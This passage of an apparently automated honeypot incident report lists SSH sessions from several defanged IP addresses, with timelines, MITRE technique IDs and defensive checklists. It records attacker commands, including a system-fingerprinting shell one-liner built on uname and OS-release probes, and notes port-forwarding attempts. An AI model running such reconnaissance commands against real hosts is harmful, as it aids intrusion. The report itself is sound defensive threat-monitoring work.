- [ ] Submit `150.136.176[.]163` to AbuseIPDB if not already reported
- [ ] Block `150.136.176[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19e621a6c665

| Field | Detail |
|---|---|
| **Source IP** | `150.136.176[.]163` |
| **First Seen** | 2026-08-30 13:12 |
| **Last Seen** | 2026-08-30 13:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:12:00` | `cowrie.session.connect` |
| `2026-08-30 13:12:00` | `cowrie.client.version` |
| `2026-08-30 13:12:00` | `cowrie.client.kex` |
| `2026-08-30 13:12:00` | `cowrie.login.success` |
| `2026-08-30 13:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.176[.]163` to AbuseIPDB if not already reported
- [ ] Block `150.136.176[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40764ad195da

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-30 13:12 |
| **Last Seen** | 2026-08-30 13:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:12:01` | `cowrie.session.connect` |
| `2026-08-30 13:12:01` | `cowrie.client.version` |
| `2026-08-30 13:12:01` | `cowrie.client.kex` |
| `2026-08-30 13:12:02` | `cowrie.login.success` |
| `2026-08-30 13:12:02` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:12:02` | `cowrie.direct-tcpip.data` |
| `2026-08-30 13:12:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f22a6b2059f0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:12 |
| **Last Seen** | 2026-08-30 13:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:12:52` | `cowrie.session.connect` |
| `2026-08-30 13:12:52` | `cowrie.client.version` |
| `2026-08-30 13:12:52` | `cowrie.client.kex` |
| `2026-08-30 13:12:53` | `cowrie.login.success` |
| `2026-08-30 13:12:54` | `cowrie.session.params` |
| `2026-08-30 13:12:54` | `cowrie.command.input` |
| `2026-08-30 13:12:54` | `cowrie.command.input` |
| `2026-08-30 13:12:54` | `cowrie.command.input` |
| `2026-08-30 13:12:54` | `cowrie.command.input` |
| `2026-08-30 13:12:54` | `cowrie.command.input` |
| `2026-08-30 13:12:54` | `cowrie.command.success` |
| `2026-08-30 13:12:54` | `cowrie.command.input` |
| `2026-08-30 13:12:54` | `cowrie.command.input` |
| `2026-08-30 13:12:54` | `cowrie.command.input` |
| `2026-08-30 13:12:54` | `cowrie.command.input` |
| `2026-08-30 13:12:54` | `cowrie.log.closed` |
| `2026-08-30 13:12:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a634a3a6dcc

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:13 |
| **Last Seen** | 2026-08-30 13:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:13:29` | `cowrie.session.connect` |
| `2026-08-30 13:13:29` | `cowrie.client.version` |
| `2026-08-30 13:13:29` | `cowrie.client.kex` |
| `2026-08-30 13:13:29` | `cowrie.login.success` |
| `2026-08-30 13:13:30` | `cowrie.session.params` |
| `2026-08-30 13:13:30` | `cowrie.command.input` |
| `2026-08-30 13:13:30` | `cowrie.log.closed` |
| `2026-08-30 13:13:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8427665b9f59

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:14 |
| **Last Seen** | 2026-08-30 13:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:14:48` | `cowrie.session.connect` |
| `2026-08-30 13:14:49` | `cowrie.client.version` |
| `2026-08-30 13:14:49` | `cowrie.client.kex` |
| `2026-08-30 13:14:50` | `cowrie.login.success` |
| `2026-08-30 13:14:51` | `cowrie.session.params` |
| `2026-08-30 13:14:51` | `cowrie.command.input` |
| `2026-08-30 13:14:51` | `cowrie.command.input` |
| `2026-08-30 13:14:51` | `cowrie.command.input` |
| `2026-08-30 13:14:51` | `cowrie.command.input` |
| `2026-08-30 13:14:51` | `cowrie.command.input` |
| `2026-08-30 13:14:51` | `cowrie.command.success` |
| `2026-08-30 13:14:51` | `cowrie.command.input` |
| `2026-08-30 13:14:51` | `cowrie.command.input` |
| `2026-08-30 13:14:51` | `cowrie.command.input` |
| `2026-08-30 13:14:51` | `cowrie.command.input` |
| `2026-08-30 13:14:51` | `cowrie.log.closed` |
| `2026-08-30 13:14:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9d61d8ebf09

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:15 |
| **Last Seen** | 2026-08-30 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:15:45` | `cowrie.session.connect` |
| `2026-08-30 13:15:45` | `cowrie.client.version` |
| `2026-08-30 13:15:45` | `cowrie.client.kex` |
| `2026-08-30 13:15:45` | `cowrie.login.success` |
| `2026-08-30 13:15:46` | `cowrie.session.params` |
| `2026-08-30 13:15:46` | `cowrie.command.input` |
| `2026-08-30 13:15:46` | `cowrie.log.closed` |
| `2026-08-30 13:15:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0993922fc57

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 13:16 |
| **Last Seen** | 2026-08-30 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:16:23` | `cowrie.session.connect` |
| `2026-08-30 13:16:23` | `cowrie.client.version` |
| `2026-08-30 13:16:24` | `cowrie.client.kex` |
| `2026-08-30 13:16:24` | `cowrie.login.success` |
| `2026-08-30 13:16:25` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:16:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 13:16:25` | `cowrie.direct-tcpip.data` |
| `2026-08-30 13:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13a2dc75bf01

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:16 |
| **Last Seen** | 2026-08-30 13:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:16:46` | `cowrie.session.connect` |
| `2026-08-30 13:16:46` | `cowrie.client.version` |
| `2026-08-30 13:16:47` | `cowrie.client.kex` |
| `2026-08-30 13:16:48` | `cowrie.login.success` |
| `2026-08-30 13:16:49` | `cowrie.session.params` |
| `2026-08-30 13:16:49` | `cowrie.command.input` |
| `2026-08-30 13:16:49` | `cowrie.command.input` |
| `2026-08-30 13:16:49` | `cowrie.command.input` |
| `2026-08-30 13:16:49` | `cowrie.command.input` |
| `2026-08-30 13:16:49` | `cowrie.command.input` |
| `2026-08-30 13:16:49` | `cowrie.command.success` |
| `2026-08-30 13:16:49` | `cowrie.command.input` |
| `2026-08-30 13:16:49` | `cowrie.command.input` |
| `2026-08-30 13:16:49` | `cowrie.command.input` |
| `2026-08-30 13:16:49` | `cowrie.command.input` |
| `2026-08-30 13:16:49` | `cowrie.log.closed` |
| `2026-08-30 13:16:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d465d2e84c1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:18 |
| **Last Seen** | 2026-08-30 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:18:05` | `cowrie.session.connect` |
| `2026-08-30 13:18:05` | `cowrie.client.version` |
| `2026-08-30 13:18:05` | `cowrie.client.kex` |
| `2026-08-30 13:18:05` | `cowrie.login.success` |
| `2026-08-30 13:18:06` | `cowrie.session.params` |
| `2026-08-30 13:18:06` | `cowrie.command.input` |
| `2026-08-30 13:18:06` | `cowrie.log.closed` |
| `2026-08-30 13:18:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b83001705a33

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:18 |
| **Last Seen** | 2026-08-30 13:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:18:40` | `cowrie.session.connect` |
| `2026-08-30 13:18:40` | `cowrie.client.version` |
| `2026-08-30 13:18:40` | `cowrie.client.kex` |
| `2026-08-30 13:18:41` | `cowrie.login.success` |
| `2026-08-30 13:18:43` | `cowrie.session.params` |
| `2026-08-30 13:18:43` | `cowrie.command.input` |
| `2026-08-30 13:18:43` | `cowrie.command.input` |
| `2026-08-30 13:18:43` | `cowrie.command.input` |
| `2026-08-30 13:18:43` | `cowrie.command.input` |
| `2026-08-30 13:18:43` | `cowrie.command.input` |
| `2026-08-30 13:18:43` | `cowrie.command.success` |
| `2026-08-30 13:18:43` | `cowrie.command.input` |
| `2026-08-30 13:18:43` | `cowrie.command.input` |
| `2026-08-30 13:18:43` | `cowrie.command.input` |
| `2026-08-30 13:18:43` | `cowrie.command.input` |
| `2026-08-30 13:18:43` | `cowrie.log.closed` |
| `2026-08-30 13:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0448ab1794a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 13:19 |
| **Last Seen** | 2026-08-30 13:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:19:02` | `cowrie.session.connect` |
| `2026-08-30 13:19:02` | `cowrie.client.version` |
| `2026-08-30 13:19:02` | `cowrie.client.kex` |
| `2026-08-30 13:19:03` | `cowrie.login.success` |
| `2026-08-30 13:19:03` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:19:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 13:19:03` | `cowrie.direct-tcpip.data` |
| `2026-08-30 13:19:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e37e5e2a96cc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:20 |
| **Last Seen** | 2026-08-30 13:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:20:20` | `cowrie.session.connect` |
| `2026-08-30 13:20:21` | `cowrie.client.version` |
| `2026-08-30 13:20:21` | `cowrie.client.kex` |
| `2026-08-30 13:20:22` | `cowrie.login.success` |
| `2026-08-30 13:20:25` | `cowrie.session.params` |
| `2026-08-30 13:20:25` | `cowrie.command.input` |
| `2026-08-30 13:20:25` | `cowrie.command.input` |
| `2026-08-30 13:20:25` | `cowrie.command.input` |
| `2026-08-30 13:20:25` | `cowrie.command.input` |
| `2026-08-30 13:20:25` | `cowrie.command.input` |
| `2026-08-30 13:20:25` | `cowrie.command.success` |
| `2026-08-30 13:20:25` | `cowrie.command.input` |
| `2026-08-30 13:20:25` | `cowrie.command.input` |
| `2026-08-30 13:20:25` | `cowrie.command.input` |
| `2026-08-30 13:20:26` | `cowrie.command.input` |
| `2026-08-30 13:20:27` | `cowrie.log.closed` |
| `2026-08-30 13:20:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-300d150e2068

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:20 |
| **Last Seen** | 2026-08-30 13:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:20:30` | `cowrie.session.connect` |
| `2026-08-30 13:20:30` | `cowrie.client.version` |
| `2026-08-30 13:20:30` | `cowrie.client.kex` |
| `2026-08-30 13:20:30` | `cowrie.login.success` |
| `2026-08-30 13:20:31` | `cowrie.session.params` |
| `2026-08-30 13:20:31` | `cowrie.command.input` |
| `2026-08-30 13:20:31` | `cowrie.log.closed` |
| `2026-08-30 13:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efd5c1a93758

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:22 |
| **Last Seen** | 2026-08-30 13:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:22:02` | `cowrie.session.connect` |
| `2026-08-30 13:22:03` | `cowrie.client.version` |
| `2026-08-30 13:22:03` | `cowrie.client.kex` |
| `2026-08-30 13:22:04` | `cowrie.login.success` |
| `2026-08-30 13:22:05` | `cowrie.session.params` |
| `2026-08-30 13:22:05` | `cowrie.command.input` |
| `2026-08-30 13:22:05` | `cowrie.command.input` |
| `2026-08-30 13:22:05` | `cowrie.command.input` |
| `2026-08-30 13:22:05` | `cowrie.command.input` |
| `2026-08-30 13:22:05` | `cowrie.command.input` |
| `2026-08-30 13:22:05` | `cowrie.command.success` |
| `2026-08-30 13:22:05` | `cowrie.command.input` |
| `2026-08-30 13:22:05` | `cowrie.command.input` |
| `2026-08-30 13:22:05` | `cowrie.command.input` |
| `2026-08-30 13:22:05` | `cowrie.command.input` |
| `2026-08-30 13:22:06` | `cowrie.log.closed` |
| `2026-08-30 13:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-552374ee6dab

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:22 |
| **Last Seen** | 2026-08-30 13:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:22:54` | `cowrie.session.connect` |
| `2026-08-30 13:22:54` | `cowrie.client.version` |
| `2026-08-30 13:22:54` | `cowrie.client.kex` |
| `2026-08-30 13:22:54` | `cowrie.login.success` |
| `2026-08-30 13:22:55` | `cowrie.session.params` |
| `2026-08-30 13:22:55` | `cowrie.command.input` |
| `2026-08-30 13:22:55` | `cowrie.log.closed` |
| `2026-08-30 13:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6380948dcf91

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:23 |
| **Last Seen** | 2026-08-30 13:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:23:49` | `cowrie.session.connect` |
| `2026-08-30 13:23:49` | `cowrie.client.version` |
| `2026-08-30 13:23:49` | `cowrie.client.kex` |
| `2026-08-30 13:23:50` | `cowrie.login.success` |
| `2026-08-30 13:23:51` | `cowrie.session.params` |
| `2026-08-30 13:23:51` | `cowrie.command.input` |
| `2026-08-30 13:23:51` | `cowrie.command.input` |
| `2026-08-30 13:23:51` | `cowrie.command.input` |
| `2026-08-30 13:23:51` | `cowrie.command.input` |
| `2026-08-30 13:23:51` | `cowrie.command.input` |
| `2026-08-30 13:23:51` | `cowrie.command.success` |
| `2026-08-30 13:23:51` | `cowrie.command.input` |
| `2026-08-30 13:23:51` | `cowrie.command.input` |
| `2026-08-30 13:23:51` | `cowrie.command.input` |
| `2026-08-30 13:23:51` | `cowrie.command.input` |
| `2026-08-30 13:23:51` | `cowrie.log.closed` |
| `2026-08-30 13:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4b115eec6cf

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:25 |
| **Last Seen** | 2026-08-30 13:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:25:25` | `cowrie.session.connect` |
| `2026-08-30 13:25:25` | `cowrie.client.version` |
| `2026-08-30 13:25:25` | `cowrie.client.kex` |
| `2026-08-30 13:25:25` | `cowrie.login.success` |
| `2026-08-30 13:25:26` | `cowrie.session.params` |
| `2026-08-30 13:25:26` | `cowrie.command.input` |
| `2026-08-30 13:25:26` | `cowrie.log.closed` |
| `2026-08-30 13:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f992e4715ef

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:25 |
| **Last Seen** | 2026-08-30 13:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
